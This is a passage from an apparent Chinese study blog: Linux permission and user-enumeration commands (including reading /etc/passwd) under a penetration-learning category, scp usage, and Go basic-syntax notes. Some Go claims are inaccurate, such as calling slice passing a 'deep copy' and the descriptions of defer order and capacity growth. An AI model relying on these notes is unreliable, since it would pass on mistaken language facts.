<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>更改所有者</td>
<td><code>chown 用户名 文件/目录</code></td>
<td>改为该用户拥有文件</td>
</tr>
<tr>
<td>更改权限</td>
<td><code>chmod</code> 命令</td>
<td><code>rwx</code> 权限设置（读/写/执行）</td>
</tr>
<tr>
<td>加入组</td>
<td><code>usermod -aG 组名 用户</code></td>
<td>加用户到指定用户组</td>
</tr>
<tr>
<td>设置 ACL</td>
<td><code>setfacl -m</code></td>
<td>精细设置用户/组的访问权限</td>
</tr>
</tbody>
</table>
<h3 id="查看用户权限"><a class="markdownIt-Anchor" href="#查看用户权限"></a> 查看用户权限;</h3>
<table>
<thead>
<tr>
<th>命令</th>
<th>用途</th>
<th>示例</th>
<th>输出解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>whoami</code></td>
<td>查看当前用户名</td>
<td><code>whoami</code></td>
<td>如：<code>alice</code></td>
</tr>
<tr>
<td><code>id</code></td>
<td>查看 UID、GID、所属组</td>
<td><code>id</code></td>
<td><code>uid=1001(alice) gid=1001(alice) groups=1001(alice),100(users)</code></td>
</tr>
<tr>
<td><code>groups</code></td>
<td>显示所属的所有组</td>
<td><code>groups</code></td>
<td>如：<code>alice users</code></td>
</tr>
<tr>
<td><code>echo $PATH</code></td>
<td>查看命令搜索路径</td>
<td><code>echo $PATH</code></td>
<td>可执行命令所在目录</td>
</tr>
<tr>
<td><code>ls -l /路径/文件</code></td>
<td>查看文件权限</td>
<td><code>ls -l /etc/passwd</code></td>
<td><code>-rw-r--r--</code> 表示所有人可读</td>
</tr>
<tr>
<td><code>namei -l /路径/文件</code></td>
<td>逐级查看路径权限</td>
<td><code>namei -l /etc/passwd</code></td>
<td>检查某级目录权限是否阻断</td>
</tr>
<tr>
<td><code>getfacl /路径/文件</code></td>
<td>查看文件的 ACL 权限（如果启用）</td>
<td><code>getfacl myfile</code></td>
<td>显示具体用户的附加权限</td>
</tr>
<tr>
<td><code>test -x 命令路径</code></td>
<td>判断某程序是否可执行</td>
<td><code>test -x /usr/bin/python3 &amp;&amp; echo &quot;可执行&quot;</code></td>
<td>返回 “可执行” 或 “不可执行”</td>
</tr>
<tr>
<td>`cat /etc/passwd</td>
<td>grep ^$(whoami)`</td>
<td>查看当前用户的 shell、主目录等</td>
<td>`cat /etc/passwd</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>段位</th>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>文件类型</td>
<td><code>-</code></td>
<td>普通文件（<code>d</code> 是目录，<code>l</code> 是符号链接）</td>
</tr>
<tr>
<td>所属用户权限</td>
<td><code>rw-</code></td>
<td><strong>root</strong> 用户：可读、可写</td>
</tr>
<tr>
<td>所属组权限</td>
<td><code>r--</code></td>
<td><strong>root</strong> 组：可读（但不可写或执行）</td>
</tr>
<tr>
<td>其他用户权限</td>
<td><code>r--</code></td>
<td>所有其他用户：可读（不可写或执行）</td>
</tr>
</tbody>
</table>
<h2 id="14scp命令"><a class="markdownIt-Anchor" href="#14scp命令"></a> 14.scp命令:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp [选项]  [源文件]  [目标路径]</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">选项:</span><br><span class="line">-1： 强制scp命令使用协议ssh1</span><br><span class="line">-2： 强制scp命令使用协议ssh2</span><br><span class="line">-4： 强制scp命令只使用IPv4寻址</span><br><span class="line">-6： 强制scp命令只使用IPv6寻址</span><br><span class="line">-B： 使用批处理模式（传输过程中不询问传输口令或短语）</span><br><span class="line">-C： 允许压缩。（将-C标志传递给ssh，从而打开压缩功能）</span><br><span class="line">-p：保留原文件的修改时间，访问时间和访问权限。</span><br><span class="line">-q： 不显示传输进度条。</span><br><span class="line">-r： 递归复制整个目录。</span><br><span class="line">-v：详细方式显示输出。scp和ssh(1)会显示出整个过程的调试信息。这些信息用于调试连接，验证和配置问题。</span><br><span class="line">-c cipher： 以cipher将数据传输进行加密，这个选项将直接传递给ssh。</span><br><span class="line">-F ssh_config： 指定一个替代的ssh配置文件，此参数直接传递给ssh。</span><br><span class="line">-i identity_file： 从指定文件中读取传输时使用的密钥文件，此参数直接传递给ssh。</span><br><span class="line">-l limit： 限定用户所能使用的带宽，以Kbit/s为单位。</span><br><span class="line">-o ssh_option： 如果习惯于使用ssh_config(5)中的参数传递方式，</span><br><span class="line">-P port：注意是大写的P, port是指定数据传输用到的端口号</span><br><span class="line">-S program： 指定加密传输时所使用的程序。此程序必须能够理解ssh(1)的选项。</span><br></pre></td></tr></table></figure>
<h3 id="1从本地复制文件到远程主机上传"><a class="markdownIt-Anchor" href="#1从本地复制文件到远程主机上传"></a> 1.从本地复制文件到远程主机(上传):</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp example.txt user@remote_host:/home/user/</span><br></pre></td></tr></table></figure>
<h3 id="2从远程主机复制文件到本地下载"><a class="markdownIt-Anchor" href="#2从远程主机复制文件到本地下载"></a> 2.从远程主机复制文件到本地(下载):</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp user@remote_host:/home/user/example.txt .     -- .表示当前目录</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>基础语法</title>
    <url>/2025/10/12/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h2 id="1verb格式化动词"><a class="markdownIt-Anchor" href="#1verb格式化动词"></a> 1.verb（格式化动词）</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在 fmt.<span class="title function_ invoke__">Printf</span>()、fmt.<span class="title function_ invoke__">Sprintf</span>() 等函数中，verb 是以 % 开头的标识符，用于告诉程序以何种格式显示变量。</span><br></pre></td></tr></table></figure>
<h3 id="1常用-verb-格式化动词表"><a class="markdownIt-Anchor" href="#1常用-verb-格式化动词表"></a> 1.常用 verb 格式化动词表</h3>
<table>
<thead>
<tr>
<th><strong>动词</strong></th>
<th><strong>含义</strong></th>
<th><strong>示例输出</strong>（假设变量值为 <code>x = 42</code>）</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>%v</code></td>
<td>默认格式输出</td>
<td><code>42</code></td>
</tr>
<tr>
<td><code>%+v</code></td>
<td>输出结构体时，包含字段名</td>
<td><code>&#123;Name:Tom Age:18&#125;</code></td>
</tr>
<tr>
<td><code>%#v</code></td>
<td>输出 Go 语法表示的值</td>
<td><code>main.User&#123;Name:&quot;Tom&quot;, Age:18&#125;</code></td>
</tr>
<tr>
<td><code>%T</code></td>
<td>显示变量类型</td>
<td><code>int</code></td>
</tr>
<tr>
<td><code>%%</code></td>
<td>输出 <code>%</code> 本身</td>
<td><code>%</code></td>
</tr>
</tbody>
</table>
<h3 id="2数值类型格式化-verb"><a class="markdownIt-Anchor" href="#2数值类型格式化-verb"></a> 2.数值类型格式化 verb</h3>
<table>
<thead>
<tr>
<th><strong>动词</strong></th>
<th><strong>说明</strong></th>
<th><strong>示例</strong> (<code>x = 42</code>)</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>%d</code></td>
<td>十进制整数</td>
<td><code>42</code></td>
</tr>
<tr>
<td><code>%b</code></td>
<td>二进制整数</td>
<td><code>101010</code></td>
</tr>
<tr>
<td><code>%o</code></td>
<td>八进制</td>
<td><code>52</code></td>
</tr>
<tr>
<td><code>%x</code></td>
<td>十六进制（小写）</td>
<td><code>2a</code></td>
</tr>
<tr>
<td><code>%X</code></td>
<td>十六进制（大写）</td>
<td><code>2A</code></td>
</tr>
<tr>
<td><code>%c</code></td>
<td>Unicode 字符</td>
<td><code>*</code>（如果 42）</td>
</tr>
</tbody>
</table>
<h3 id="3字符串和布尔类型"><a class="markdownIt-Anchor" href="#3字符串和布尔类型"></a> 3.字符串和布尔类型</h3>
<table>
<thead>
<tr>
<th><strong>动词</strong></th>
<th><strong>说明</strong></th>
<th><strong>示例</strong> (<code>s = &quot;hello&quot;</code>)</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>%s</code></td>
<td>字符串</td>
<td><code>hello</code></td>
</tr>
<tr>
<td><code>%q</code></td>
<td>双引号字符串</td>
<td><code>&quot;hello&quot;</code></td>
</tr>
<tr>
<td><code>%t</code></td>
<td>布尔值</td>
<td><code>true</code> 或 <code>false</code></td>
</tr>
</tbody>
</table>
<h3 id="4总结表"><a class="markdownIt-Anchor" href="#4总结表"></a> 4.总结表</h3>
<table>
<thead>
<tr>
<th>类别</th>
<th>verb</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>常规</td>
<td><code>%v</code> <code>%+v</code> <code>%#v</code> <code>%T</code> <code>%%</code></td>
<td>通用格式</td>
</tr>
<tr>
<td>整数</td>
<td><code>%d</code> <code>%b</code> <code>%o</code> <code>%x</code> <code>%X</code> <code>%c</code></td>
<td>数值格式</td>
</tr>
<tr>
<td>字符串</td>
<td><code>%s</code> <code>%q</code></td>
<td>字符串处理</td>
</tr>
<tr>
<td>布尔值</td>
<td><code>%t</code></td>
<td>布尔值显示</td>
</tr>
</tbody>
</table>
<h2 id="2关键字25个"><a class="markdownIt-Anchor" href="#2关键字25个"></a> 2.关键字(25个):</h2>
<table>
<thead>
<tr>
<th>关键字</th>
<th>含义说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>break</code></td>
<td>跳出循环或 <code>switch</code></td>
</tr>
<tr>
<td><code>case</code></td>
<td><code>switch</code> 语句中的分支条件</td>
</tr>
<tr>
<td><code>chan</code></td>
<td>声明通道</td>
</tr>
<tr>
<td><code>const</code></td>
<td>声明常量</td>
</tr>
<tr>
<td><code>continue</code></td>
<td>继续下一次循环</td>
</tr>
<tr>
<td><code>default</code></td>
<td><code>switch</code> 默认分支</td>
</tr>
<tr>
<td><code>defer</code></td>
<td>延迟执行（函数结束前执行）</td>
</tr>
<tr>
<td><code>else</code></td>
<td>条件语句的“否则”分支</td>
</tr>
<tr>
<td><code>fallthrough</code></td>
<td><code>switch</code> 穿透下一分支</td>
</tr>
<tr>
<td><code>for</code></td>
<td>循环语句</td>
</tr>
<tr>
<td><code>func</code></td>
<td>声明函数</td>
</tr>
<tr>
<td><code>go</code></td>
<td>启动一个 goroutine（协程）</td>
</tr>
<tr>
<td><code>goto</code></td>
<td>跳转到标签</td>
</tr>
<tr>
<td><code>if</code></td>
<td>条件判断语句</td>
</tr>
<tr>
<td><code>import</code></td>
<td>导入包</td>
</tr>
<tr>
<td><code>interface</code></td>
<td>定义接口类型</td>
</tr>
<tr>
<td><code>map</code></td>
<td>映射类型（键值对结构）</td>
</tr>
<tr>
<td><code>package</code></td>
<td>声明包名</td>
</tr>
<tr>
<td><code>range</code></td>
<td>用于遍历数组、切片、map 等</td>
</tr>
<tr>
<td><code>return</code></td>
<td>返回函数结果</td>
</tr>
<tr>
<td><code>select</code></td>
<td>多通道选择</td>
</tr>
<tr>
<td><code>struct</code></td>
<td>声明结构体</td>
</tr>
<tr>
<td><code>switch</code></td>
<td>多分支选择语句</td>
</tr>
<tr>
<td><code>type</code></td>
<td>声明类型</td>
</tr>
<tr>
<td><code>var</code></td>
<td>声明变量</td>
</tr>
</tbody>
</table>
<h3 id="总结表"><a class="markdownIt-Anchor" href="#总结表"></a> 总结表</h3>
<table>
<thead>
<tr>
<th>类别</th>
<th>关键字举例</th>
</tr>
</thead>
<tbody>
<tr>
<td>控制流程</td>
<td><code>if</code>, <code>else</code>, <code>for</code>, <code>switch</code>, <code>case</code>, <code>fallthrough</code>, <code>break</code>, <code>continue</code>, <code>goto</code>, <code>return</code></td>
</tr>
<tr>
<td>并发相关</td>
<td><code>go</code>, <code>select</code>, <code>chan</code></td>
</tr>
<tr>
<td>定义声明</td>
<td><code>var</code>, <code>const</code>, <code>type</code>, <code>func</code>, <code>package</code>, <code>import</code>, <code>struct</code>, <code>interface</code>, <code>map</code></td>
</tr>
<tr>
<td>特殊用途</td>
<td><code>defer</code>, <code>range</code></td>
</tr>
</tbody>
</table>
<h2 id="3常量"><a class="markdownIt-Anchor" href="#3常量"></a> 3.常量:</h2>
<table>
<thead>
<tr>
<th>标识符</th>
<th>类型</th>
<th>是否为常量</th>
<th>用途说明</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>true</code></td>
<td><code>bool</code></td>
<td>✅ 是常量</td>
<td>表示布尔真值</td>
<td><code>const ok = true</code></td>
</tr>
<tr>
<td><code>false</code></td>
<td><code>bool</code></td>
<td>✅ 是常量</td>
<td>表示布尔假值</td>
<td><code>var done = false</code></td>
</tr>
<tr>
<td><code>iota</code></td>
<td><code>int</code></td>
<td>⚠️ 特殊标识符</td>
<td>用于 <strong>常量声明组中自动生成递增数字</strong>（仅在 <code>const</code> 中可用）</td>
<td><code>const (A = iota; B; C)</code></td>
</tr>
<tr>
<td><code>nil</code></td>
<td><code>预定义空值</code></td>
<td>⚠️ 不是 const 常量</td>
<td>表示<strong>指针、切片、map、chan、接口、函数的零值</strong>（未初始化）</td>
<td><code>var p *int = nil</code></td>
</tr>
</tbody>
</table>
<h3 id="声明方式"><a class="markdownIt-Anchor" href="#声明方式"></a> 声明方式:</h3>
<table>
<thead>
<tr>
<th>声明方式</th>
<th>示例</th>
<th>说明</th>
<th>是否支持类型推导</th>
</tr>
</thead>
<tbody>
<tr>
<td>1. 显式声明（带类型）</td>
<td><code>var a int</code></td>
<td>默认值为0（int）</td>
<td>❌ 不支持</td>
</tr>
<tr>
<td>2. 显式声明 + 初始化</td>
<td><code>var a int = 10</code></td>
<td>有初始值</td>
<td>✅ 支持（可省略类型）</td>
</tr>
<tr>
<td>3. 类型推导声明</td>
<td><code>var a = 10</code></td>
<td>类型自动为 int</td>
<td>✅</td>
</tr>
<tr>
<td>4. 短变量声明</td>
<td><code>a := 10</code></td>
<td>只能在函数内部使用</td>
<td>✅</td>
</tr>
<tr>
<td>5. 多变量声明</td>
<td><code>var a, b int = 1, 2</code></td>
<td>可多个变量同时声明</td>
<td>✅</td>
</tr>
<tr>
<td>6. 匿名变量</td>
<td><code>_ = someFunc()</code></td>
<td>用于忽略返回值</td>
<td>❌</td>
</tr>
<tr>
<td>7. 常量声明</td>
<td><code>const Pi = 3.14</code></td>
<td>值不可修改</td>
<td>✅（编译期推导）</td>
</tr>
</tbody>
</table>
<h2 id="4类型"><a class="markdownIt-Anchor" href="#4类型"></a> 4.类型:</h2>
<h3 id="1分类"><a class="markdownIt-Anchor" href="#1分类"></a> 1.分类:</h3>
<table>
<thead>
<tr>
<th>类型类别</th>
<th>描述说明</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>1. <strong>基础类型</strong></td>
<td>内建类型，Go 提供的最基本类型</td>
<td><code>int</code>, <code>string</code>, <code>bool</code></td>
</tr>
<tr>
<td>2. <strong>复合类型</strong></td>
<td>由多个值组合而成的结构，支持更复杂的数据结构</td>
<td><code>array</code>, <code>slice</code>, <code>map</code>, <code>struct</code></td>
</tr>
<tr>
<td>3. <strong>引用类型</strong></td>
<td>本质是指向底层数据的指针或引用（非值拷贝）</td>
<td><code>pointer</code>, <code>channel</code>, <code>func</code></td>
</tr>
<tr>
<td>4. <strong>自定义类型</strong></td>
<td>使用 <code>type</code> 关键字定义的新类型，包含结构体、接口、别名等</td>
<td><code>type MyInt int</code>、<code>type Person struct &#123;...&#125;</code></td>
</tr>
</tbody>
</table>
<h3 id="2基础类型"><a class="markdownIt-Anchor" href="#2基础类型"></a> 2.基础类型:</h3>
<table>
<thead>
<tr>
<th>类型名</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>int</code></td>
<td>整数类型（平台相关位数）</td>
</tr>
<tr>
<td><code>int32</code></td>
<td>32 位整数</td>
</tr>
<tr>
<td><code>float64</code></td>
<td>64 位浮点数</td>
</tr>
<tr>
<td><code>bool</code></td>
<td>布尔值（true/false）</td>
</tr>
<tr>
<td><code>string</code></td>
<td>字符串类型</td>
</tr>
</tbody>
</table>
<h3 id="3复合类型"><a class="markdownIt-Anchor" href="#3复合类型"></a> 3.复合类型:</h3>
<table>
<thead>
<tr>
<th>类型</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>array</code></td>
<td>定长数组</td>
</tr>
<tr>
<td><code>slice</code></td>
<td>动态数组切片</td>
</tr>
<tr>
<td><code>map</code></td>
<td>映射结构，键值对存储</td>
</tr>
<tr>
<td><code>struct</code></td>
<td>自定义结构体，可组合多字段</td>
</tr>
</tbody>
</table>
<h3 id="4引用类型"><a class="markdownIt-Anchor" href="#4引用类型"></a> 4.引用类型:</h3>
<table>
<thead>
<tr>
<th>类型</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>pointer</code></td>
<td>指针类型</td>
</tr>
<tr>
<td><code>channel</code></td>
<td>并发通道类型（用于 goroutine 通信）</td>
</tr>
<tr>
<td><code>func</code></td>
<td>函数类型，可作为变量/参数传递</td>
</tr>
</tbody>
</table>
<h3 id="5自定义类型"><a class="markdownIt-Anchor" href="#5自定义类型"></a> 5.自定义类型：</h3>
<table>
<thead>
<tr>
<th>类型形式</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>自定义基本类型</td>
<td><code>type MyInt int</code></td>
</tr>
<tr>
<td>自定义结构体</td>
<td><code>type Student struct &#123;...&#125;</code></td>
</tr>
<tr>
<td>自定义接口</td>
<td><code>type Writer interface &#123;...&#125;</code></td>
</tr>
<tr>
<td>类型别名（不是新类型）</td>
<td><code>type Rune = int32</code></td>
</tr>
</tbody>
</table>
<h3 id="6总结"><a class="markdownIt-Anchor" href="#6总结"></a> 6.总结 ：</h3>
<table>
<thead>
<tr>
<th>分类</th>
<th>关键字/构造方式</th>
<th>是否值类型</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>基础类型</td>
<td><code>int</code>, <code>string</code>, <code>bool</code></td>
<td>✅</td>
<td><code>var name string</code></td>
</tr>
<tr>
<td>复合类型</td>
<td><code>array</code>, <code>slice</code>, <code>map</code></td>
<td>❌（slice/map是引用）</td>
<td><code>[]int</code>, <code>map[string]int</code></td>
</tr>
<tr>
<td>引用类型</td>
<td><code>*T</code>, <code>chan T</code>, <code>func()</code></td>
<td>❌</td>
<td><code>var p *int</code></td>
</tr>
<tr>
<td>自定义类型</td>
<td><code>type</code> 关键字定义</td>
<td>取决于底层类型</td>
<td><code>type ID int</code>, <code>type T = U</code></td>
</tr>
</tbody>
</table>
<h2 id="5iota"><a class="markdownIt-Anchor" href="#5iota"></a> 5.iota：</h2>
<p>与const来表示枚举类型:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const (</span><br><span class="line">a=10*iota</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h2 id="6多返回值"><a class="markdownIt-Anchor" href="#6多返回值"></a> 6.多返回值:</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mailres</span><span class="params">(a <span class="type">int</span>)</span></span>(<span class="type">int</span>,<span class="type">int</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span>(</span><br><span class="line">	b=a*<span class="number">2</span></span><br><span class="line">	c=a*<span class="number">3</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">return</span> b,c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="const分析"><a class="markdownIt-Anchor" href="#const分析"></a> const分析:</h3>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">Go 中的 <span class="keyword">const</span> 是“编译期常量”，意味着它的值在编译阶段必须 完全确定，不能依赖运行时信息。</span><br><span class="line">不能和任何变量相用</span><br></pre></td></tr></table></figure>
<h2 id="7go模块化"><a class="markdownIt-Anchor" href="#7go模块化"></a> 7.go模块化:</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">初始化mod；</span><br><span class="line">module go_project</span><br><span class="line"><span class="keyword">go</span> <span class="number">1.24</span><span class="number">.2</span></span><br><span class="line">这一步会生成 <span class="keyword">go</span>.mod 文件，告诉 Go：</span><br><span class="line">我这个项目的模块名是 go_project，你以后从 go_project/lib1 导入时，就从当前目录找。</span><br><span class="line">/go_project/</span><br><span class="line">├── <span class="keyword">go</span>.mod</span><br><span class="line">├── main.<span class="keyword">go</span></span><br><span class="line">└── lib1/</span><br><span class="line">    └── lib1.<span class="keyword">go</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>方式</th>
<th>示例代码</th>
<th>含义</th>
<th>特点</th>
<th>使用说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>匿名导入</strong></td>
<td><code>import _ &quot;fmt&quot;</code></td>
<td>给包起名为 <code>_</code>（匿名）</td>
<td>❌ 无法使用包里的函数 ✅ 会执行包的 <code>init()</code> 方法</td>
<td>常用于只需要执行包初始化逻辑，但不直接使用其函数，例如：注册驱动 <code>import _ &quot;github.com/lib/pq&quot;</code></td>
</tr>
<tr>
<td><strong>别名导入</strong></td>
<td><code>import aa &quot;fmt&quot;</code></td>
<td>给 <code>fmt</code> 包起别名 <code>aa</code></td>
<td>✅ 使用时需写 <code>aa.Println()</code> 等</td>
<td>适用于避免多个包冲突，或希望起更简洁的名称</td>
</tr>
<tr>
<td><strong>点导入</strong></td>
<td><code>import . &quot;fmt&quot;</code></td>
<td>将 <code>fmt</code> 包的方法直接导入到当前作用域</td>
<td>✅ 可以直接写 <code>Println()</code> 而不是 <code>fmt.Println()</code></td>
<td>不推荐频繁使用，容易造成命名混淆，常见于测试或临时场景</td>
</tr>
</tbody>
</table>
<h2 id="8defer的使用"><a class="markdownIt-Anchor" href="#8defer的使用"></a> 8.defer的使用:</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span>之后的语句先执⾏，<span class="keyword">defer</span>后的语句后执⾏</span><br><span class="line">       --<span class="keyword">defer</span> 后会直接压入栈底</span><br></pre></td></tr></table></figure>
<h2 id="9数组"><a class="markdownIt-Anchor" href="#9数组"></a> 9.数组:</h2>
<h3 id="1静态数组"><a class="markdownIt-Anchor" href="#1静态数组"></a> 1静态数组:</h3>
<h4 id="声明方式-2"><a class="markdownIt-Anchor" href="#声明方式-2"></a> 声明方式:</h4>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myA [<span class="number">10</span>]<span class="type">int</span></span><br><span class="line">myB:=[<span class="number">10</span>]<span class="type">int</span>&#123;&#125;     --&#123;&#125;可加可不加</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pr</span><span class="params">(arr [10]<span class="type">int</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//这样是浅拷贝，不会影响原值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2动态数组"><a class="markdownIt-Anchor" href="#2动态数组"></a> 2.动态数组:</h3>
<h4 id="声明方式-3"><a class="markdownIt-Anchor" href="#声明方式-3"></a> 声明方式:</h4>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 声明 slice1 是一个切片，并且初始化，默认值是 1, 2, 3。长度 len 是 3</span></span><br><span class="line">slice1 := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明 slice1 是一个切片，但是并没有给 slice 分配空间</span></span><br><span class="line"><span class="keyword">var</span> slice1 []<span class="type">int</span></span><br><span class="line">slice1 = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>)  <span class="comment">// 开辟 3 个空间，默认值是 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明 slice1 是一个切片，同时给 slice 分配空间，3 个空间，初始化值是 0</span></span><br><span class="line"><span class="keyword">var</span> slice1 []<span class="type">int</span> = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明 slice1 是一个切片，同时给 slice 分配空间，3 个空间，初始化值是 0，</span></span><br><span class="line"><span class="comment">// 通过 := 推导出 slice 是一个切片</span></span><br><span class="line">slice1 := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pr</span><span class="params">(arr []<span class="type">int</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//这样是深拷贝，会影响原值，传递的是指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="append增加"><a class="markdownIt-Anchor" href="#append增加"></a> append增加:</h4>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">当动态数组通过</span><br><span class="line">         --myA=<span class="built_in">append</span>(myA,<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"> <span class="built_in">cap</span>:容量会扩大两倍</span><br><span class="line"> 但是<span class="built_in">len</span>:只会增加<span class="number">2</span></span><br></pre></td></tr></table></figure>
<h3 id="3截取操作"><a class="markdownIt-Anchor" href="#3截取操作"></a> 3.截取操作:</h3>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">newSlice := oldSlice[start:end]</span><br><span class="line">            start：起始下标（包含）</span><br><span class="line">            end：结束下标（不包含）</span><br><span class="line">            结果长度：end - start</span><br><span class="line">但是<span class="built_in">cap</span>：容量和原切片一致</span><br></pre></td></tr></table></figure>
<h2 id="10map键值对类似字典"><a class="markdownIt-Anchor" href="#10map键值对类似字典"></a> 10.map(键值对类似字典):</h2>
<h3 id="1声明方式"><a class="markdownIt-Anchor" href="#1声明方式"></a> 1.声明方式:</h3>
<table>
<thead>
<tr>
<th>声明方式</th>
<th>示例代码</th>
<th>是否需要 <code>make</code></th>
<th>是否支持立即赋值</th>
<th>常用场景</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>var + make</code></td>
<td><code>var m map[string]string&lt;br&gt;m = make(map[string]string)&lt;br&gt;m[&quot;key&quot;] = &quot;value&quot;</code></td>
<td>✅ 是</td>
<td>❌ 否</td>
<td>全局变量，需延后初始化</td>
</tr>
<tr>
<td><code>:= + make</code></td>
<td><code>m := make(map[int]string)&lt;br&gt;m[1] = &quot;value&quot;</code></td>
<td>✅ 是</td>
<td>❌ 否</td>
<td>局部变量，简洁初始化</td>
</tr>
<tr>
<td>字面量初始化</td>
<td><code>m := map[string]string&#123;&lt;br&gt;  &quot;k1&quot;: &quot;v1&quot;,&lt;br&gt;  &quot;k2&quot;: &quot;v2&quot;,&lt;br&gt;&#125;</code></td>
<td>❌ 否</td>
<td>✅ 是</td>
<td>已知数据时快速初始化</td>
</tr>
</tbody>
</table>
<h2 id="11面向对象"><a class="markdownIt-Anchor" href="#11面向对象"></a> 11.面向对象</h2>
<p>Go 语言不是典型的面向对象语言，但它通过 <strong>结构体 + 接口</strong> 实现了封装、继承和多态的能力。</p>
<table>
<thead>
<tr>
<th>特性</th>
<th>Go实现方式</th>
<th>示例</th>
<th>特点</th>
</tr>
</thead>
<tbody>
<tr>
<td>封装</td>
<td>字段/方法首字母大写表示<strong>公开</strong>，小写表示<strong>私有</strong></td>
<td><code>Name string</code> vs <code>name string</code></td>
<td>访问控制基于大小写</td>
</tr>
<tr>
<td>继承</td>
<td><strong>通过组合（Embedding）结构体</strong>实现“继承”</td>
<td><code>type Student struct &#123; Human &#125;</code></td>
<td>没有 <code>extends</code>，但有字段/方法提升</td>
</tr>
<tr>
<td>多态</td>
<td><strong>通过接口 interface</strong> 实现</td>
<td><code>type Speaker interface &#123; Speak() &#125;</code></td>
<td>接口隐式实现，无需关键字</td>
</tr>
</tbody>
</table>
<h2 id="12结构体标签"><a class="markdownIt-Anchor" href="#12结构体标签"></a> 12.结构体标签:</h2>
<p>在 Go 语言中，<strong>结构体标签（Tag）</strong> 是给结构体字段添加额外元信息的一种方式，最常见的应用场景是用于 <strong>JSON 编解码、数据库ORM映射、验证器等</strong>。</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>示例</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>语法格式</td>
<td><code>字段名 类型 </code>标签名:“值”<code> </code></td>
<td>标签必须用反引号 <code> </code> <code> </code> `</td>
</tr>
<tr>
<td>JSON 标签</td>
<td><code>json:&quot;name&quot;</code></td>
<td>用于控制字段序列化时的名称</td>
</tr>
<tr>
<td>多标签</td>
<td><code>json:&quot;name&quot; db:&quot;user_name&quot;</code></td>
<td>多个标签中间用空格分隔</td>
</tr>
<tr>
<td>忽略字段</td>
<td><code>json:&quot;-&quot;</code></td>
<td>被 <code>-</code> 忽略，不参与序列化</td>
</tr>
<tr>
<td>结构体字段首字母必须大写</td>
<td><code>Name string</code></td>
<td>小写字段无法导出，标签也无效</td>
</tr>
</tbody>
</table>
<h3 id="标签的用途"><a class="markdownIt-Anchor" href="#标签的用途"></a> 标签的用途</h3>
<table>
<thead>
<tr>
<th>用途</th>
<th>标签示例</th>
<th>第三方库</th>
</tr>
</thead>
<tbody>
<tr>
<td>JSON</td>
<td><code>json:&quot;name&quot;</code></td>
<td><code>encoding/json</code></td>
</tr>
<tr>
<td>数据库ORM</td>
<td><code>gorm:&quot;column:user_name&quot;</code></td>
<td><code>gorm</code></td>
</tr>
<tr>
<td>表单验证</td>
<td><code>validate:&quot;required&quot;</code></td>
<td><code>go-playground/validator</code></td>
</tr>
<tr>
<td>配置解析</td>
<td><code>yaml:&quot;port&quot;</code></td>
<td><code>gopkg.in/yaml.v2</code></td>
</tr>
<tr>
